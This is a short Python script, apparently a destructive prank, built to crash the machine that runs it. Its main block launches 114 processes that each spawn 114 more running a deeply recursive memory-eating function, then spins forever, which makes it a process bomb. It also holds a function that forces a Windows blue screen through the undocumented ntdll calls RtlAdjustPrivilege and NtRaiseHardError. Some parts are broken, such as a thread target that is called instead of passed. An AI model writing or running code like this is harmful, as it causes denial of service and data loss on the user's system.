import random as r
import threading
import ctypes
from HighPrecisionType import HighPrecisionFloat as HPF
from concurrent.futures import ThreadPoolExecutor
import multiprocessing as mp

class Boom():
    def __init__(self):
        pass

    @staticmethod
    def nuke(val):
        a = []
        for i in range(10):
            if val > 1:
                a.append(Boom.nuke(val-1))
            else:
                a.append(i)
        return a

    @staticmethod
    def H_Nuke(val):
        threads = []
        for i in range(val):
            thread = threading.Thread(target=Boom.nuke(10))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
    def trigger_blue_screen():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

def more_threads(function:callable, times, args=(), depth=10):
    if depth > 1:
        more_threads(function, times, args, depth-1)
    else:
        for i in range(times):
            mp.Process(target=function, args=args).start()

if __name__ == "__main__":
    for i in range(114):
        mp.Process(target=more_threads, args=(Boom.nuke, 114, (10,))).start()
    while True:
        pass